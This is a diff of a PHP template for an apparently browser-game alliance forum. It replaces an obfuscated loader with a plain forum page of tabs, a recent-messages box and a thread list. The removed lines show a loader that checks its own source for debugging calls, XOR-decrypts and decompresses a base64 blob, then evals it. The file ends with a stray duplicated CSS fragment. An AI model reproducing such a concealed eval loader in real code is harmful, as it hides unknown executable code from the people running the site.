@@ -1,24 +1,264 @@
 <?php
-$iwgvpbcflx="f2e3fc839b6bf0b0c5a26a47e11da6ba";
-$wrwylkotbzd="57000006540600525c03505157525553065107060254010e5703085c02545a52";
-$rlkwzn="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";
-$khkmmdsi=file_get_contents(__FILE__);
-$qvihtesf=str_replace($rlkwzn,"",$khkmmdsi);
-if(strpos($qvihtesf,"ec"."ho")!==false||strpos($qvihtesf,"pr"."int")!==false||strpos($qvihtesf,"var_"."dump")!==false||strpos($qvihtesf,"file_put_"."contents")!==false||strpos($qvihtesf,"fw"."rite")!==false){die();}
-$zklkjk=str_replace(array($iwgvpbcflx,$wrwylkotbzd),array("SP_3f50cb47","KP_48a71c9a"),$khkmmdsi);
-$iqpcrpmwv=md5($zklkjk);
-$bydulvza=hex2bin($wrwylkotbzd);
-$hsrlmyil="";
-$fhpejbiyv=strlen($iqpcrpmwv);
-for($kqxalhip=0;$kqxalhip<$fhpejbiyv;$kqxalhip++){
-$hsrlmyil.=chr(ord($bydulvza[$kqxalhip])^ord($iqpcrpmwv[$kqxalhip]));
-}
-$qpbzfx=base64_decode($rlkwzn);
-$fmnjapuuh=strlen($qpbzfx);
-$lvqyrgzuq="";
-$xjedeo=strlen($hsrlmyil);
-for($kqxalhip=0;$kqxalhip<$fmnjapuuh;$kqxalhip++){
-$lvqyrgzuq.=$qpbzfx[$kqxalhip]^$hsrlmyil[$kqxalhip%$xjedeo];
-}
-$gcgfbexdzh="gzun"."compress";
-eval('?>' . $gcgfbexdzh($lvqyrgzuq) . '<?php ');
+// BB Code Parser instance
+require_once __DIR__ . '/../../Helpers/BBCodeParser.php';
+$bbParser = new \App\Helpers\BBCodeParser();
+?>
+
+<!-- Category Tabs -->
+<table class="vis" width="100%" style="margin-bottom: 5px;">
+    <tr>
+        <?php foreach ($sections as $sec): ?>
+            <td style="padding: 0;">
+                <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=forum&section_id=<?= $sec['id'] ?>"
+                    class="forum-tab <?= ($sec['id'] == $section['id']) ? 'active' : '' ?>">
+                    <?php if (!empty($sec['icon'])): ?>
+                        <?= $sec['icon'] ?>
+                    <?php endif; ?>
+                    <?= htmlspecialchars($sec['name']) ?>
+                </a>
+            </td>
+        <?php endforeach; ?>
+        <?php if ($can_moderate): ?>
+            <td style="padding: 0;">
+                <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=forum&action=manage_categories"
+                    class="forum-tab">
+                    ⚙️
+                </a>
+            </td>
+        <?php endif; ?>
+    </tr>
+</table>
+
+<!-- New Messages Box -->
+<div id="new_messages_box" style="border: 2px solid #804000; background-color: #f4e4bc; margin-bottom: 10px;">
+    <table width="100%" cellpadding="0" cellspacing="0">
+        <tr class="head">
+            <td style="padding: 5px; font-style: italic;">
+                <?= __('screens.ally_forum.new_messages') ?: 'Novas mensagens no fórum' ?>
+            </td>
+            <td align="right" style="padding: 5px;">
+                <input type="checkbox" id="exclude_muted" style="vertical-align: middle;">
+                <span style="font-size: 11px;"><?= __('screens.ally_forum.exclude_muted') ?: 'Excluir publicações de fóruns silenciados' ?></span>
+                <a href="javascript:void(0)" onclick="toggleNewMessages()" id="toggle_new_messages"
+                    style="margin-left: 10px;">
+                    <img src="graphic/icons/minus.png" alt="<?= __('screens.ally_forum.hide') ?: 'Esconder' ?>" id="toggle_icon">
+                </a>
+            </td>
+        </tr>
+    </table>
+
+    <div id="new_messages_content">
+        <table class="vis" width="100%" style="margin: 0;">
+            <tr>
+                <th width="40%"><?= __('screens.ally_forum.topics') ?: 'Tópico' ?></th>
+                <th width="30%"><?= __('screens.ally_forum.forum') ?: 'Fórum' ?></th>
+                <th width="30%"><?= __('screens.ally_forum.last_message') ?: 'Última mensagem' ?></th>
+            </tr>
+            <?php
+            // Get recent threads from all sections
+            $recentThreadsQuery = "SELECT t.*, s.name as section_name, u.username as author_name,
+                        (SELECT username FROM users WHERE id = t.last_post_user_id) as last_post_author,
+                        (SELECT COUNT(*) FROM ally_forum_posts p WHERE p.thread_id = t.id AND p.created_at > COALESCE(
+                            (SELECT last_read_time FROM ally_forum_read WHERE user_id = ? AND thread_id = t.id), 0
+                        )) as unread_count
+                 FROM ally_forum_threads t
+                 JOIN ally_forum_sections s ON t.section_id = s.id
+                 LEFT JOIN users u ON t.user_id = u.id
+                 WHERE t.ally_id = ?
+                 ORDER BY t.last_post_time DESC
+                 LIMIT 5";
+
+            $recentThreads = $db->fetchAll($recentThreadsQuery, [$user['id'], $ally['id']]);
+
+            if (!empty($recentThreads)):
+                foreach ($recentThreads as $thread):
+                    ?>
+                    <tr class="row_b">
+                        <td style="padding: 4px;">
+                                    <?php if ($thread['unread_count'] > 0): ?>
+                                <img src="graphic/icons/new_report.png" alt="<?= __('screens.ally_forum.new') ?: 'Novo' ?>" style="vertical-align: middle; margin-right: 3px;">
+                                    <?php endif; ?>
+                            <a
+                                href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=forum&thread_id=<?= $thread['id'] ?>">
+                                        <?= htmlspecialchars($thread['title']) ?>
+                            </a>
+                        </td>
+                        <td style="padding: 4px;"><?= htmlspecialchars($thread['section_name']) ?></td>
+                        <td style="padding: 4px;">
+                            <strong><?= htmlspecialchars($thread['last_post_author'] ?? $thread['author_name']) ?></strong><br>
+                            <small><?= sprintf(__('screens.ally_forum.at_date_time'), date('d.m.Y', $thread['last_post_time'] ?? $thread['created_at']), date('H:i', $thread['last_post_time'] ?? $thread['created_at'])) ?></small>
+                        </td>
+                    </tr>
+                   <?php
+                endforeach;
+            else:
+                ?>
+                    <tr>
+                    <td colspan="3" align="center" style="padding: 10px;">
+                        <i><?= __('screens.ally_forum.no_new_messages') ?: 'Nenhuma mensagem nova' ?></i>
+                    </td>
+                </tr>
+                    <?php
+            endif;
+            ?>
+         <tr>
+                <td colspan="3" align="center" style="padding: 5px; background-color: #c1a264;">
+                    <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=forum" style="color: #000;"><?= __('screens.ally_forum.next_5') ?: 'Próximo 5' ?> &gt;&gt;</a>
+                </td>
+            </tr>
+        </table>
+    </div>
+</div>
+
+<script>
+    function toggleNewMessages() {
+        var content = document.getElementById('new_messages_content');
+        var icon = document.getElementById('toggle_icon');
+
+        if (content.style.display === 'none') {
+            content.style.display = 'block';
+            icon.src = 'graphic/icons/minus.png';
+            icon.alt = '<?= __('screens.ally_forum.hide') ?: 'Esconder' ?>';
+        } else {
+            content.style.display = 'none';
+            icon.src = 'graphic/icons/plus.png';
+            icon.alt = '<?= __('screens.ally_forum.show') ?: 'Mostrar' ?>';
+        }
+    }
+</script>
+
+<!-- Category Title -->
+<h2 style="margin: 20px 0 10px 0;"><?= htmlspecialchars($section['name']) ?></h2>
+
+<!-- Action Links (Right side) -->
+<div style="text-align: right; margin-bottom: 10px;">
+    <a href="javascript:void(0)">&raquo; <?= __('screens.ally_forum.mark_forum_read') ?: 'Marcar fórum como lido' ?></a>
+    <a href="javascript:void(0)" style="margin-left: 15px;">&raquo; <?= __('screens.ally_forum.mark_all_read') ?: 'Marcar todos fóruns como lidos' ?></a>
+    <a href="javascript:void(0)" style="margin-left: 15px;">&raquo; <?= __('screens.ally_forum.disable_notifications') ?: 'Desativar notificações de fórum' ?></a>
+</div>
+
+<!-- Action Buttons -->
+<table style="margin-bottom: 10px;">
+    <tr>
+        <td>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=forum&section_id=<?= $section['id'] ?>&action=new_thread"
+                class="forum-button">
+                📝 <?= __('screens.ally_forum.new_thread') ?: 'Novo tópico' ?>
+            </a>
+        </td>
+        <td style="padding-left: 5px;">
+            <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=forum&section_id=<?= $section['id'] ?>&action=new_poll"
+                class="forum-button">
+                📊 <?= __('screens.ally_forum.new_poll') ?: 'Nova sondagem' ?>
+            </a>
+        </td>
+        <td style="padding-left: 20px;">
+            <input type="text" placeholder="<?= __('screens.ally_forum.search_placeholder') ?: 'Procurar nos fóruns' ?>" style="width: 200px; padding: 3px;">
+            <button class="forum-button" style="padding: 3px 10px;">🔍</button>
+        </td>
+    </tr>
+</table>
+
+<!-- Thread List -->
+<table class="vis" width="100%">
+    <tr>
+        <th width="5%"></th>
+        <th width="40%"><?= __('screens.ally_forum.topics') ?: 'Tópicos' ?></th>
+        <th width="20%"><?= __('screens.ally_forum.author') ?: 'Autor' ?></th>
+        <th width="20%"><?= __('screens.ally_forum.last_message') ?: 'Última mensagem' ?></th>
+        <th width="15%"><?= __('screens.ally_forum.replies') ?: 'Respostas' ?></th>
+    </tr>
+
+    <?php if (empty($threads)): ?>
+        <tr>
+            <td colspan="5" align="center" style="padding: 20px;">
+                <i><?= __('screens.ally_forum.no_threads_in_forum') ?: 'Nenhum tópico neste fórum' ?></i><br><br>
+                <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=forum&section_id=<?= $section['id'] ?>&action=new_thread"
+                    class="forum-button">
+                    <?= __('screens.ally_forum.create_first_thread') ?: 'Criar primeiro tópico' ?>
+                </a>
+            </td>
+        </tr>
+    <?php else: ?>
+        <?php foreach ($threads as $thread): ?>
+            <tr class="<?= $thread['is_sticky'] ? 'row_a' : 'row_b' ?>">
+                <td align="center">
+                    <?php if ($thread['is_sticky']): ?>
+                        📌
+                    <?php elseif ($thread['is_locked']): ?>
+                        🔒
+                    <?php elseif ($thread['is_poll']): ?>
+                        📊
+                    <?php else: ?>
+                        💬
+                    <?php endif; ?>
+                </td>
+                <td>
+                    <?php if ($thread['is_sticky']): ?>
+                        <img src="graphic/forwarded.png" alt="" style="vertical-align: middle;">
+                    <?php endif; ?>
+                    <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=forum&thread_id=<?= $thread['id'] ?>">
+                        <?= htmlspecialchars($thread['title']) ?>
+                    </a>
+                </td>
+                <td>
+                    <strong><?= htmlspecialchars($thread['author_name'] ?? (__('screens.report.unknown') ?: 'Desconhecido')) ?></strong><br>
+                    <small><?= sprintf(__('screens.ally_forum.at_date_time'), date('d.m.Y', $thread['created_at']), date('H:i', $thread['created_at'])) ?></small>
+                </td>
+                <td>
+                    <?php if ($thread['last_post_time']): ?>
+                        <strong><?= htmlspecialchars($thread['last_post_author'] ?? (__('screens.report.unknown') ?: 'Desconhecido')) ?></strong><br>
+                        <small><?= sprintf(__('screens.ally_forum.at_date_time'), date('d.m.Y', $thread['last_post_time']), date('H:i', $thread['last_post_time'])) ?></small>
+                    <?php else: ?>
+                        -
+                    <?php endif; ?>
+                </td>
+                <td align="center">
+                    <?= $thread['replies'] ?? 0 ?>
+                </td>
+            </tr>
+        <?php endforeach; ?>
+    <?php endif; ?>
+</table>
+
+<style>
+    .forum-tab {
+        display: inline-block;
+        background-color: #f4e4bc;
+        border: 1px solid #c0a070;
+        border-bottom: none;
+        padding: 5px 15px;
+        text-decoration: none;
+        color: #000;
+        margin-right: 2px;
+    }
+
+    .forum-tab:hover {
+        background-color: #e0d0a0;
+    }
+
+    .forum-tab.active {
+        background-color: #fff;
+        font-weight: bold;
+        border-bottom: 1px solid #fff;
+        position: relative;
+        z-index: 1;
+    }
+
+    .forum-button {
+        background-color: #f4e4bc;
+        border: 1px solid #c0a070;
+        padding: 5px 10px;
+        text-decoration: none;
+        color: #000;
+        display: inline-block;
+        cursor: pointer;
+    }
+
+    .forum-button:hover {
+        background-color: #e0d0a0;
+    }
+</style>
+        background-color: #e0d0a0;
+    }
+</style>
